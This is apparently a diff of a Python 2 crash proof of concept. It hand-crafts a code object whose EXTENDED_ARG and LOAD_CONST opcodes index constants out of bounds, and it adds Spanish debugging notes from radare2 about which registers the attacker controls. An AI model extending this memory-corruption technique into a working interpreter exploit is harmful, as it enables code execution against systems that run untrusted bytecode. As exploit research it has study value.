@@ -9,12 +9,13 @@ def a():
 
 a.func_code = types.CodeType(
   0, 0, 0, 0,
-  chr(opcode.opmap['EXTENDED_ARG']) + '\xaa\xbb' +
+  #chr(opcode.opmap['EXTENDED_ARG']) + '\xaa\xbb' +
   chr(opcode.opmap['EXTENDED_ARG']) + '\xef\xbe' +
   chr(opcode.opmap['LOAD_CONST'])   + '\xad\xde',
   (), (), (), '', '', 0, ''
 )
 a()
+
 # r2 -d python crash.py
 
 """
@@ -33,4 +34,5 @@ orax 0xffffffffffffffff
 
 PROBLEMA:
 rdx deberia ser 0xbeefdead pero es 0xffffffffbeefdead
+solo controlo ebx
 """
